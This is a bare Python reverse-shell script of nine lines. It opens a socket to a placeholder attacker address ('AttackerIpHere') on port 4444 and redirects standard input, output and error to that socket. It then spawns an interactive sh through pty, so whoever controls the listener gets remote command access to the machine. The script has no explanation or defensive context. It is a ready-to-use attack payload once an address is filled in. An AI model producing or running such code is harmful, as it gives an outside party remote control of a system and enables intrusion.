import os
import pty
import socket
s = socket.socket()
s.connect(("AttackerIpHere", 4444))
for f in (0, 1, 2):
    os.dup2(s.fileno(), f)
pty.spawn("sh")
